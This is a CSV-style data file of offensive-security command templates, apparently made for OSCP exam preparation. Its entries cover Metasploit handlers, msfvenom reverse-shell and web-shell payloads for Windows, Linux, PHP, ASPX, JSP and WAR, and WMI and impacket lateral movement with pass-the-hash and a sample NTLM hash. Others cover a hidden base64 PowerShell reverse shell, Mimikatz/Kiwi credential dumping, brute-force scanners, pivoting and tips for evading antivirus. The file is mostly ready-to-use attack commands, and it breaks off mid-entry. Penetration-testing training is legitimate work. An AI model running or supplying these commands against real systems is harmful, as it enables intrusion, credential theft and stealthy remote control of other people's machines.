"msf-handler-background","Start Handler as Background Job","exploitation","use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; run -j","Start listener in background to continue working while waiting for connections","metasploit","Background jobs allow multiple handlers on different ports simultaneously.

Essential for multi-target engagements.

Check status with 'jobs' command.","high"
"msf-handler-autorunscript","Handler with AutoRunScript Post-Exploitation","exploitation","use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; set AutoRunScript <SCRIPT>; run -j","Configure handler to automatically run post-exploitation module when session opens","metasploit","Common AutoRunScripts:
migrate (process stability), hashdump (credential harvesting), autoroute (pivoting setup).

Test scripts manually before automation.","medium"
"msf-handler-exitonsession","Handler with ExitOnSession Control","exploitation","use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; set ExitOnSession false; run -j","Configure handler to continue listening after receiving first session (multi-session support)","metasploit","Essential for catching shells from multiple targets with single handler.

Useful for mass exploitation or persistence payloads.

Set BEFORE running handler.","medium"
"msf-session-upgrade-shell","Upgrade Shell to Meterpreter","exploitation","sessions -u <SESSION_ID>","Upgrade existing command shell session to Meterpreter (adds advanced features)","metasploit","Upgrade uploads Meterpreter payload to target and executes it.

Creates NEW session (original shell remains).

May trigger AV/EDR.

Windows/Linux support varies.","medium"
"msf-session-script","Run Script on Session","exploitation","sessions -s <SCRIPT> -i <SESSION_ID>","Execute post-exploitation script on specific session without interacting","metasploit","Useful for batch operations on multiple sessions.

Runs in background without interaction.

Results stored in database/loot.","low"
"msf-session-command","Run Command on Session","exploitation","sessions -c '<COMMAND>' -i <SESSION_ID>","Execute single command on session without interactive mode","metasploit","Quick way to run single command without full interaction.

Useful for scripting and automation.

Command type must match session type.","low"
"msf-session-kill","Kill Active Session","exploitation","sessions -k <SESSION_ID>","Terminate specific session and close connection to target","metasploit","Gracefully closes session.

Use -K to kill all sessions (careful in multi-target engagements).

Session cannot be recovered after killing.","medium"
"wmi-legacy-wmic","WMI - Legacy wmic Command (Deprecated)","active-directory","wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create ""<COMMAND>""","Execute commands on remote Windows system using deprecated wmic utility (RPC port 135 + high port 19152-65535)","lateral-movement","OSCP TRAINING MATERIAL - WMI LATERAL MOVEMENT:
WHAT IS WMI:
Windows Management Instrumentation is an object-oriented feature for task automation.

Historically abused for lateral movement via remote process creation using Win32_Process class.

DEPRECATION STATUS:
wmic.exe deprecated in Windows 10 21H1+ but STILL PRESENT in OSCP exam environments (Windows Server 2019/2022).

Must know for exam.

SESSION 0 BEHAVIOR (CRITICAL):
System processes and services always run in Session 0 as part of session isolation (introduced Windows Vista).

Because WMI Provider Host runs as a SYSTEM service, newly created processes through WMI spawn in Session 0.

This means:
- GUI applications like calc.exe won't be visible to logged-in users
- Verify execution via Task Manager or tasklist, NOT by looking for windows
- Process runs with SYSTEM or user privileges depending on method

PORT REQUIREMENTS:
- TCP 135:
RPC endpoint mapper (required for initial connection)
- TCP 49152-65535:
Dynamic/ephemeral port range for session data (Windows Server 2008+)
- Older systems use 1024-5000 range
- Firewall must allow BOTH port 135 AND high-range ports

UAC REMOTE RESTRICTIONS:
Domain users bypass UAC remote restrictions (different than local accounts).

This is why jen (domain user + local admin) can execute without UAC prompts.

MANUAL ALTERNATIVE:
PowerShell Get-WmiObject -Class Win32_Process | Invoke-WmiMethod -Name Create -ArgumentList ""calc"" uses same WMI API.

TIME ESTIMATE:
2-3 minutes for command execution + verification.

EXAM STRATEGY:
Use wmic for quick proof-of-concept, then upgrade to reverse shell via wmi-powershell-revshell.","high"
"wmi-invoke-method","WMI - PowerShell Invoke-WmiMethod","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '<COMMAND>' -ComputerName <TARGET> -Credential $credential","Execute commands remotely using PowerShell Invoke-WmiMethod with Win32_Process class","lateral-movement","OSCP METHODOLOGY - POWERSHELL WMI EXECUTION:
WHY POWERSHELL OVER WMIC:
Modern alternative that provides better error handling, credential object support, and programmatic control.

Wmic is deprecated but PowerShell WMI cmdlets remain supported.

CREDENTIAL OBJECT REQUIREMENT:
Must create PSCredential object first:
1.

ConvertTo-SecureString converts plaintext password to secure string
2.

New-Object System.Management.Automation.PSCredential combines username + secure password
3.

This object is reusable across multiple WMI calls

PROTOCOL:
Uses DCOM (Distributed COM) over RPC:
- Port 135 for endpoint mapper
- Dynamic port 49152-65535 for data channel
- Same underlying protocol as wmic utility

SESSION 0 EXECUTION:
Processes spawn in Session 0 (system services context).

Verify with tasklist, not GUI.

UAC REMOTE RESTRICTIONS BYPASS:
Domain users automatically bypass UAC remote restrictions per MS14-068.

Local accounts (except RID-500 Administrator) are restricted.

MANUAL DISCOVERY METHOD:
1.

Get-WmiObject -Class Win32_Process -List (shows available methods)
2.

Identify Create method signature
3.

Invoke-WmiMethod calls the Create method with ArgumentList

TIME ESTIMATE:
3-5 minutes (PSCredential creation + execution + verification).

EXAM TIP:
Save PSCredential one-liner in notes for quick reuse during exam.","high"
"wmi-new-cimsession","WMI - PowerShell New-CimSession","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<COMMAND>'}","Create CIM session over DCOM protocol and execute commands via Invoke-CimMethod","lateral-movement","OSCP TRAINING - CIM SESSION METHOD (RECOMMENDED POWERSHELL APPROACH):
WHAT IS CIM:
Common Information Model - Microsoft's modern replacement for WMI cmdlets.

Introduced PowerShell 3.0+.

WHY USE CIM OVER WMI CMDLETS:
- Better error handling and structured output
- Session reusability (create once, use many times)
- Supports both DCOM and WS-MAN (WinRM) protocols
- Future-proof (WMI cmdlets may be deprecated)

DCOM PROTOCOL SELECTION:
New-CimSessionOption -Protocol DCOM forces legacy DCOM protocol instead of WinRM:
- No WinRM service requirement (port 5985/5986)
- Uses RPC port 135 + ephemeral ports 49152-65535
- Compatible with older Windows systems
- Bypasses WinRM configuration requirements (TrustedHosts, etc.)

SESSION PERSISTENCE ADVANTAGE:
1.

Create session once with New-CimSession (stores credentials)
2.

Reuse $session variable for multiple Invoke-CimMethod calls
3.

No re-authentication overhead
4.

Faster than Invoke-WmiMethod for multiple commands

COMMAND EXECUTION FLOW (FROM TRAINING MATERIAL):
1.

Create PSCredential object (username + password)
2.

Set session options to DCOM protocol
3.

Establish CimSession to target (authentication happens here)
4.

Invoke-CimMethod executes Win32_Process.Create remotely
5.

Process spawns in Session 0 on target

STEALTH BENEFITS:
- No WinRM event logs (uses DCOM not WS-MAN)
- No service creation (unlike PSExec)
- Native Windows feature (not suspicious)

TIME ESTIMATE:
2-4 minutes (session setup + command execution).

EXAM STRATEGY:
Use this method when you need to run multiple commands on same target - session reuse saves time.","high"
"wmi-impacket-exec","WMI - Impacket wmiexec (Kali)","active-directory","impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Semi-interactive shell via WMI from Kali using impacket-wmiexec (executes commands through WMI without touching disk)","lateral-movement","OSCP TRAINING - IMPACKET WMIEXEC (PRIMARY KALI → WINDOWS LATERAL MOVEMENT):
TRAINING MATERIAL EXAMPLE:
From OSCP module, jen's account used to move from Kali to FILES04 using NTLM hash:
'impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73'

WHAT IS IMPACKET-WMIEXEC:
Python-based semi-interactive shell that executes commands remotely via WMI without writing binaries to disk.

Part of Impacket suite (installed by default on Kali).

HOW IT WORKS (TECHNICAL BREAKDOWN):
1.

Authenticates to target via SMB (port 445) using provided credentials
2.

Creates temporary administrative share (ADMIN$ or custom)
3.

Executes commands via WMI Win32_Process.Create method (port 135 + ephemeral)
4.

Retrieves command output via SMB share
5.

Deletes output file from share
6.

Repeats for each command (semi-interactive loop)

FILELESS EXECUTION:
- No .exe binary dropped to disk
- No service created (unlike PSExec)
- All execution through native WMI Provider Host
- Output temporarily written to share then deleted

PROTOCOL REQUIREMENTS:
- SMB (port 445):
Authentication + output retrieval
- RPC (port 135):
WMI communication
- Ephemeral ports (49152-65535):
Session data

PASS-THE-HASH SUPPORT (CRITICAL FOR OSCP):
Use -hashes flag with format :NTLM (LM hash optional, usually blank):
'impacket-wmiexec -hashes :NTLM_HASH user@target'
No password cracking needed - authenticate with hash directly.

STEALTH ADVANTAGES OVER PSEXEC:
- No Event ID 7045 (service creation)
- No psexesvc.exe binary on disk
- Less antivirus detection
- Native WMI process creation (appears legitimate)

SEMI-INTERACTIVE SHELL BEHAVIOR:
- Each command executes independently (not truly interactive)
- Current directory NOT preserved between commands
- Use full paths or 'cd /d C:\Path && command' syntax
- No tab completion

TIME ESTIMATE:
1-2 minutes for connection, <1 second per command execution.

EXAM STRATEGY:
Preferred tool for lateral movement from Kali when you have credentials or NTLM hashes.

More reliable than evil-winrm in some environments.","high"
"wmi-cme-exec","WMI - CrackMapExec Command Execution","active-directory","crackmapexec smb <TARGET> -u <USER> -p <PASS> -x '<COMMAND>'","Execute single command on remote Windows via WMI using CrackMapExec","lateral-movement","EDUCATIONAL CONTEXT:
CrackMapExec wraps Impacket for rapid command execution.

WHY USE CME:
Supports subnet spraying (192.168.50.0/24), multiple hosts in single command.

BEHIND THE SCENES:
Uses wmiexec execution method by default.

COMPARISON:
-x for cmd.exe, -X for PowerShell, choose based on command type.

TIME ESTIMATE:
<1 minute for single command.

EXAM TIP:
Quick way to test command execution across multiple hosts.","high"
"wmi-powershell-revshell","WMI - PowerShell Reverse Shell","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; $command = 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}","Deploy base64-encoded PowerShell reverse shell via WMI for callback to attacker","lateral-movement","EDUCATIONAL CONTEXT:
Combines WMI lateral movement with PowerShell reverse shell for full interactive access.

WHY BASE64:
Avoids escaping issues with special characters in PowerShell one-liner.

HOW TO GENERATE:
Use base64-encode-powershell command or Python script from module.

STEALTH CONSIDERATIONS:
Runs in Session 0 (system context), encoded to avoid AV signature detection.

MANUAL DECODE:
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')).

TIME ESTIMATE:
3-5 minutes including payload generation.

EXAM TIP:
Pre-generate payloads before exam for various LHOST/LPORT combinations.","high"
"wmi-verify-enabled","WMI - Verify Service Enabled","active-directory","Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGET> -Credential (Get-Credential)","Verify WMI service is running and accessible on remote target","lateral-movement","EDUCATIONAL CONTEXT:
Quick test to verify WMI accessibility before attempting lateral movement.

WHY WIN32_OPERATINGSYSTEM:
Lightweight query that exists on all Windows versions.

ALTERNATIVE TEST:
wmic /node:<TARGET> /user:<USER> os get caption (from cmd.exe).

FIREWALL REQUIREMENTS:
Needs RPC port 135 and high-range dynamic ports.

TIME ESTIMATE:
<1 minute for verification.","medium"
"mysql-connect-interactive","MySQL Interactive Connection","exploitation","mysql -h <TARGET> -u <USER> -p","Connect to MySQL database with interactive password prompt for secure authentication","database-exploitation","Interactive password prompt prevents password exposure in shell history and process list.

More secure than inline password (-p'password').

Default port 3306.","high"
"smbmap-enumerate-auth","SMBMap Enumerate with Credentials","exploitation","smbmap -u <USER> -p <PASS> -H <TARGET>","Enumerate SMB shares and permissions using valid credentials","network-exploitation","Null session attempt:
-u '' -p ''.

Check for WRITE permissions for exploitation.

Common shares:
C$, ADMIN$, IPC$, SYSVOL, NETLOGON.","high"
"grep-metasploit-exploits","Search Metasploit Exploits Directory","exploitation","grep -r '<QUERY>' /usr/share/metasploit-framework/modules/exploits/","Search Metasploit exploit modules for specific service or vulnerability","metasploit","Metasploit modules location:
/usr/share/metasploit-framework/modules/exploits/<platform>/<service>/.

Search by CVE:
grep -r 'CVE-2021-1234'.

OSCP:
Limited Metasploit usage (one module only).","medium"
"nmap-msf-import","Nmap to Metasploit Database Import","exploitation","nmap <OPTIONS> <TARGET> -oX scan.xml && msf-db-import scan.xml","Scan target with Nmap and import results into Metasploit database for module targeting","metasploit","OSCP:
Rarely needed, Metasploit usage limited to one module.

More useful for lab practice.

Import command in msfconsole:
db_import scan.xml","low"
"msfvenom-linux-x86-shell","MSFVenom Linux x86 Reverse Shell","exploitation","msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT>","Generate 32-bit Linux reverse shell executable","metasploit","Use for 32-bit Linux systems.

Check architecture:
uname -m (i686=32-bit, x86_64=64-bit).

Non-staged payload (no Metasploit handler required).","high"
"msfvenom-linux-x64-meterpreter","MSFVenom Linux x64 Meterpreter","exploitation","msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT>","Generate 64-bit Linux Meterpreter reverse shell (requires Metasploit handler)","metasploit","OSCP:
Counts as Metasploit usage (one module limit).

Staged payload requires multi/handler.

Use shell_reverse_tcp for non-Metasploit listener.","medium"
"msfvenom-windows-shell-tcp","MSFVenom Windows Reverse Shell","exploitation","msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT>","Generate Windows reverse shell executable (non-staged, works with nc)","metasploit","Non-staged (underscore) works with netcat listener.

For AV evasion:
-e x86/shikata_ga_nai -i 10.

Use port 443 or 80 for firewall bypass.","high"
"msfvenom-windows-meterpreter-tcp","MSFVenom Windows Meterpreter","exploitation","msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT>","Generate Windows Meterpreter reverse shell (requires Metasploit handler)","metasploit","OSCP:
Counts as Metasploit usage (one module limit).

Staged payload (/) requires multi/handler.

Use shell_reverse_tcp for nc listener.","medium"
"google-exploitdb-search","Google ExploitDB Search Query","exploitation","google: site:exploit-db.com <SERVICE>","Manual Google search query to find ExploitDB entries for specific service (not executable command)","general","This is a manual search query for web browser, not an executable command.

Use in Google search bar.

Offline alternative:
searchsploit <SERVICE>.

OSCP exam:
searchsploit preferred (no internet).","medium"
"curl-web-server-verify","Verify Web Server Status","exploitation","curl -I http://<TARGET>:<PORT>","Check if web server is up and retrieve HTTP headers","web-exploitation","Quick verification before enumeration.

Headers reveal server type (Apache, nginx, IIS), technology (PHP, ASP.NET), potential vulnerabilities.","high"
"whatweb-technology-id","Identify Web Technologies","exploitation","whatweb http://<TARGET>","Identify web server, frameworks, CMS, and technologies in use","web-exploitation","Identifies WordPress, Joomla, Drupal, etc.

Technology stack informs attack strategy (PHP exploits, ASP.NET deserialization, etc.).","high"
"nc-listener-non-staged","Netcat Listener for Non-Staged Shells","exploitation","nc -nvlp <LPORT>","Start netcat listener for non-staged reverse shells (shell_reverse_tcp, not meterpreter)","general","For non-staged payloads (underscore):
shell_reverse_tcp, cmd_reverse_tcp.

Staged payloads (slash) require multi/handler.

Use rlwrap for better shell.","high"
"rlwrap-nc-listener","Netcat Listener with Readline Support","exploitation","rlwrap nc -lvnp <LPORT>","Netcat listener with arrow keys, history, and command editing (readline wrapper)","general","Quality of life improvement for interactive shells.

Arrow keys and history work immediately.

Essential for Windows shells without Python.","high"
"ls-metasploit-auxiliary","List Metasploit Auxiliary Scanners","exploitation","ls /usr/share/metasploit-framework/modules/auxiliary/scanner/<SERVICE>/","List available Metasploit auxiliary modules for specific service enumeration","metasploit","OSCP:
Limited Metasploit usage.

Common services:
smb, http, ftp, ssh, mysql, postgres, mssql.

Auxiliary modules don't count toward exploit module limit.","low"
"msfvenom-windows-x64-meterpreter-tcp","MSFVenom Windows x64 Meterpreter Alternative","exploitation","msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT>","Generate 64-bit Windows Meterpreter non-staged payload (works with nc or multi/handler)","metasploit","Non-staged (underscore) Meterpreter.

Larger file size but single-stage delivery.

OSCP:
Counts as Metasploit usage.","medium"
"msfvenom-linux-x64-meterpreter-non-staged","MSFVenom Linux x64 Meterpreter Non-Staged","exploitation","msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT>","Generate 64-bit Linux Meterpreter non-staged payload","metasploit","OSCP:
Counts as Metasploit usage.

Non-staged larger but single delivery.

Use shell_reverse_tcp for nc listener.","medium"
"msfvenom-jsp-war-shell","MSFVenom JSP WAR Reverse Shell","exploitation","msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o <OUTPUT>","Generate Java JSP reverse shell packaged as WAR file for Tomcat deployment","metasploit","For Tomcat exploitation with manager access.

Deploy via /manager/html upload.

Default Tomcat port:
8080.

Non-staged payload works with nc.","high"
"rubeus-ptt","Rubeus Pass-the-Ticket","exploitation","Rubeus.exe ptt /ticket:<FILE>","Import Kerberos ticket into current session for authentication (Pass-the-Ticket attack)","active-directory","OSCP:
Pass-the-Ticket attack using stolen Kerberos tickets.

Requires Windows host.

Rubeus.exe must be uploaded to target.

Alternative:
Mimikatz.","high"
"msf-show-auxiliary","List All Auxiliary Modules","exploitation","show auxiliary","Display all available auxiliary modules including scanners, fuzzers, denial-of-service modules, and protocol-specific enumeration tools","metasploit","Output is very long (900+ modules).

Use 'search' with filters instead for practical use.

Auxiliary modules don't directly exploit but support enumeration, fuzzing, and reconnaissance.","low"
"msf-search-auxiliary","Search for Auxiliary Modules","exploitation","search type:auxiliary <SERVICE>","Search for auxiliary modules related to specific service or protocol","metasploit","Common auxiliary categories:
scanner (port/service scanning), gather (information gathering), admin (administrative tasks), fuzzers (protocol fuzzing), dos (denial of service).","high"
"msf-aux-smb-version","SMB Version Detection","exploitation","use auxiliary/scanner/smb/smb_version; set RHOSTS <TARGET>; run","Detect SMB protocol version and OS information from target Windows/Samba hosts","metasploit","Automatically checks for SMB signing requirement (stored as vulnerability if disabled).

Detects SMB 1.0, 2.0, 2.1, 3.0, 3.1.1 versions.

Use THREADS=10 for faster network-wide scanning.","high"
"msf-aux-smb-enumshares","SMB Share Enumeration","exploitation","use auxiliary/scanner/smb/smb_enumshares; set RHOSTS <TARGET>; run","Enumerate accessible SMB shares on Windows/Samba targets","metasploit","Tests both authenticated and unauthenticated access.

Look for writable shares (WRITE permission) for potential initial access.

Common interesting shares:
SYSVOL, NETLOGON, C$, ADMIN$.","high"
"msf-aux-ssh-login","SSH Login Scanner (Brute Force)","exploitation","use auxiliary/scanner/ssh/ssh_login; set RHOSTS <TARGET>; set USERNAME <USER>; set PASS_FILE <WORDLIST>; run","Perform SSH password brute force attack with username and password list","metasploit","Creates session automatically on success (unlike Hydra).

Use STOP_ON_SUCCESS=true to stop after first valid credential.

Default THREADS=1 is very slow - increase for practical use.

Be aware of account lockout policies.","medium"
"msf-aux-mysql-login","MySQL Login Scanner","exploitation","use auxiliary/scanner/mysql/mysql_login; set RHOSTS <TARGET>; set USERNAME root; set PASS_FILE <WORDLIST>; run","Brute force MySQL authentication with username and password combinations","metasploit","Common MySQL default usernames:
root, mysql, admin.

Try BLANK_PASSWORDS=true first.

Successful login provides database access via mysql client:
mysql -h <TARGET> -u <USER> -p<PASS>","medium"
"msf-aux-ftp-version","FTP Version Scanner","exploitation","use auxiliary/scanner/ftp/ftp_version; set RHOSTS <TARGET>; run","Detect FTP server version via banner grabbing","metasploit","Banner grabbing is passive and unlikely to trigger alarms.

Look for version numbers to search exploits.

Common vulnerable FTP servers:
vsftpd 2.3.4 (backdoor), ProFTPD 1.3.3c (backdoor).","medium"
"msf-aux-ftp-anonymous","FTP Anonymous Access Scanner","exploitation","use auxiliary/scanner/ftp/anonymous; set RHOSTS <TARGET>; run","Test for anonymous FTP login and enumerate accessible files","metasploit","Successful anonymous access often leads to:
file exfiltration, configuration file access, or writable directories for payload upload.

Check for home directories, backup files, and web roots.","high"
"msf-aux-portscan-tcp","TCP Port Scanner","exploitation","use auxiliary/scanner/portscan/tcp; set RHOSTS <TARGET>; set PORTS <PORTS>; run","Perform TCP SYN port scan from within Metasploit","metasploit","Generally slower than nmap.

Use for situations where nmap unavailable or need results in Metasploit database.

Does not detect service versions - use db_nmap -sV for that.","low"
"msf-aux-http-dir-scanner","HTTP Directory Scanner","exploitation","use auxiliary/scanner/http/dir_scanner; set RHOSTS <TARGET>; set DICTIONARY <WORDLIST>; run","Brute force web directories and files using wordlist","metasploit","Metasploit's directory scanner is significantly slower than dedicated tools like gobuster.

Consider using alternatives for practical engagements.

Useful when integrated workflow requires database storage.","low"
"meterpreter-help","Display Meterpreter Help","exploitation","help","List all available Meterpreter commands organized by category","metasploit","Commands organized by category:
Core Commands, File System, System, Networking, Webcam, Audio, Sniffer, etc.

Use 'help <command>' for detailed syntax.","medium"
"meterpreter-background","Background Meterpreter Session","exploitation","background","Send current Meterpreter session to background and return to msfconsole","metasploit","Session remains active in background.

Return with:
sessions -i <ID>.

Use Ctrl+Z as quick shortcut.","high"
"meterpreter-sysinfo","Display System Information","exploitation","sysinfo","Get target system information (OS, architecture, computer name, domain)","metasploit","First command to run after gaining Meterpreter access.

Provides OS version for exploit/privesc selection.

Shows domain membership for lateral movement planning.","high"
"meterpreter-getuid","Get Current User Context","exploitation","getuid","Display username and privileges of current Meterpreter process","metasploit","Check immediately to determine privilege escalation needs.

NT AUTHORITY\SYSTEM = highest Windows privileges.

Root = highest Linux privileges.","high"
"meterpreter-getprivs","Display Current Privileges","exploitation","getprivs","List all privileges enabled for current process (Windows only)","metasploit","Key privileges:
SeImpersonatePrivilege (token impersonation), SeDebugPrivilege (process debugging), SeBackupPrivilege (file access).

Use for identifying privesc paths.","high"
"meterpreter-getsystem","Escalate to SYSTEM Privileges","exploitation","getsystem","Attempt privilege escalation to NT AUTHORITY\SYSTEM using multiple techniques","metasploit","Requires local admin privileges.

Techniques use named pipe impersonation or token duplication.

PrintSpooler variant (technique 4) most reliable on modern Windows.","high"
"meterpreter-ps","List Running Processes","exploitation","ps","Display all running processes with PID, name, architecture, session, user, and path","metasploit","Identify stable processes for migration (explorer.exe, svchost.exe).

Look for user-owned processes to match integrity level.

Note architecture (x86 vs x64) for migration compatibility.","high"
"meterpreter-migrate","Migrate to Different Process","exploitation","migrate <PID>","Move Meterpreter execution to different process for stability and stealth","metasploit","Migrate ASAP after initial access to prevent session loss.

Choose long-running stable processes (explorer.exe, svchost.exe).

Match architecture.

Migration changes user context.","high"
"meterpreter-execute","Execute Program on Target","exploitation","execute -f <PROGRAM> -a '<ARGS>' -i -H","Start program on target system with optional arguments, interaction, and hidden window","metasploit","Use -H to avoid alerting user.

Common uses:
execute -f notepad.exe -H (hidden notepad for migration target), execute -f cmd.exe -i (interactive shell).","medium"
"meterpreter-shell","Drop to System Shell","exploitation","shell","Open interactive system shell (cmd.exe on Windows, /bin/sh on Linux)","metasploit","Creates channel for shell I/O.

Use Ctrl+Z to background shell and return to Meterpreter (don't use 'exit' which kills channel).

Shell runs in current process context.","high"
"meterpreter-pwd","Print Working Directory","exploitation","pwd","Display current working directory on target system","metasploit","Shows target system's current directory, not local machine.

Use before file operations to verify location.","medium"
"meterpreter-ls","List Directory Contents","exploitation","ls <PATH>","List files and directories at specified path or current directory","metasploit","Look for sensitive files:
proof.txt, local.txt, passwords, .config, .ssh, database files.

Use -r for recursive listing.","high"
"meterpreter-cd","Change Directory","exploitation","cd <PATH>","Change current working directory on target system","metasploit","Navigate to user directories, Desktop, Documents for sensitive files.

Common targets:
C:/Users/<USER>/Desktop, /home/<USER>, /root","medium"
"meterpreter-download","Download File from Target","exploitation","download <REMOTE_FILE> <LOCAL_PATH>","Transfer file from target system to attacker machine","metasploit","Download proof flags, sensitive files, SAM database, configuration files.

Use -r for directories.

Change local directory first with 'lcd'.","high"
"meterpreter-upload","Upload File to Target","exploitation","upload <LOCAL_FILE> <REMOTE_PATH>","Transfer file from attacker machine to target system","metasploit","Upload privilege escalation tools, persistence payloads, enumeration scripts.

Common targets:
/tmp (Linux), C:\Windows\Temp (Windows).","high"
"meterpreter-cat","Display File Contents","exploitation","cat <FILE>","Read and display file contents from target system","metasploit","Quick way to read flags, passwords, config files.

For binary files or large files, use download instead.","high"
"meterpreter-search","Search for Files","exploitation","search -f <FILENAME> -d <DIRECTORY>","Search target filesystem for files matching pattern","metasploit","Common searches:
-f proof.txt, -f local.txt, -f *.kdbx, -f *.config, -f *password*.

Search can be slow on large filesystems.","high"
"meterpreter-hashdump","Dump Password Hashes","exploitation","hashdump","Extract password hashes from Windows SAM database (requires SYSTEM privileges)","metasploit","Requires SYSTEM privileges.

Dumps LM and NTLM hashes.

Hashes automatically stored in Metasploit database.

Use hashcat or John to crack offline.","high"
"meterpreter-load-kiwi","Load Kiwi Extension (Mimikatz)","exploitation","load kiwi","Load Kiwi extension providing Mimikatz capabilities for credential extraction","metasploit","Kiwi is Metasploit's implementation of Mimikatz.

Provides commands:
creds_all, lsa_dump_sam, dcsync, golden_ticket_create, etc.

Often flagged by AV/EDR.","high"
"meterpreter-kiwi-creds-all","Dump All Credentials with Kiwi","exploitation","creds_all","Extract all available credentials from memory using Kiwi (after loading)","metasploit","Extracts credentials from LSASS memory.

Requires admin/SYSTEM.

Results automatically stored in Metasploit database.

Use msf-db-creds to view.","high"
"meterpreter-screenshot","Capture Screenshot","exploitation","screenshot","Capture screenshot of target system's current desktop","metasploit","Useful for documentation and identifying sensitive information on screen.

Saved to ~/.msf4/loot/ by default.

Requires active desktop session.","low"
"meterpreter-idletime","Check User Idle Time","exploitation","idletime","Display how long user has been idle (no keyboard/mouse input)","metasploit","Use to determine if user is actively at computer.

High idle time = safer to run visible commands without detection.

Check before screenshot, keylogging, or GUI manipulation.","medium"
"meterpreter-route-add","Add Route to Internal Network","exploitation","run autoroute -s <SUBNET>/<NETMASK>","Add routing through compromised host to reach internal network","metasploit","Enables Metasploit modules to target internal networks through compromised host.

Use 'run autoroute -p' to view routes.

Combine with SOCKS proxy for external tool access.","high"
"meterpreter-portfwd-add","Forward Port Through Compromised Host","exploitation","portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_HOST>","Create port forward from attacker machine through compromised host to internal target","metasploit","Example:
Forward RDP:
portfwd add -l 3389 -p 3389 -r 172.16.5.100, then connect to localhost:3389.

List forwards:
portfwd list.

Delete:
portfwd delete -l <port>","high"
"msfvenom-list-payloads","List Available Payloads","exploitation","msfvenom -l payloads --platform <PLATFORM> --arch <ARCH>","Display all payloads available for specific platform and architecture","metasploit","Staged payloads contain '/' (e.g., windows/meterpreter/reverse_tcp).

Non-staged contain '_' (e.g., windows/meterpreter_reverse_tcp).

Use filters to reduce overwhelming output.","medium"
"msfvenom-windows-reverse","Generate Windows Reverse Shell Executable","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe","Create Windows 64-bit executable with non-staged TCP reverse shell","metasploit","Non-staged payload (shell_reverse_tcp) is self-contained.

Staged variant (shell/reverse_tcp) requires multi/handler.

Use Netcat for non-staged, multi/handler for staged.","high"
"msfvenom-windows-meterpreter","Generate Windows Meterpreter Executable","exploitation","msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<LHOST> LPORT=<LPORT> -f exe -o met.exe","Create Windows 64-bit executable with non-staged Meterpreter over HTTPS","metasploit","HTTPS transport encrypts C2 traffic and blends with normal web traffic.

Requires multi/handler with matching payload.

Non-staged (_) vs staged (/) distinction critical for handler setup.","high"
"msfvenom-linux-reverse","Generate Linux ELF Reverse Shell","exploitation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf","Create Linux 64-bit ELF executable with non-staged TCP reverse shell","metasploit","After uploading to target, must chmod +x before execution.

ELF binaries often caught by AV - consider alternatives like scripting languages (Python, Bash).","high"
"msfvenom-php-reverse","Generate PHP Web Shell","exploitation","msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php","Create PHP Meterpreter reverse shell for web application exploitation","metasploit","Upload via file upload vulnerability or writable web directory.

Execute by browsing to uploaded file.

PHP Meterpreter has limited features compared to Windows/Linux variants.","high"
"msfvenom-aspx-reverse","Generate ASPX Web Shell","exploitation","msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx","Create ASPX web shell for IIS server exploitation","metasploit","ASPX shells run on Windows IIS servers.

Upload via file upload vuln or writable webdav.

Default IIS execution context is low-privileged service account.","medium"
"msfvenom-jsp-reverse","Generate JSP Web Shell","exploitation","msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp","Create JSP web shell for Java application servers (Tomcat, JBoss, WebLogic)","metasploit","JSP format for manual upload.

WAR format for Tomcat Manager deployment.

JSP files must be in webroot or accessible web directory.","medium"
"msfvenom-war-reverse","Generate WAR Reverse Shell for Tomcat","exploitation","msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war","Create WAR file containing reverse shell for Tomcat Manager deployment","metasploit","Deploy via Tomcat Manager GUI or curl.

After deployment, trigger by browsing to deployed application path.

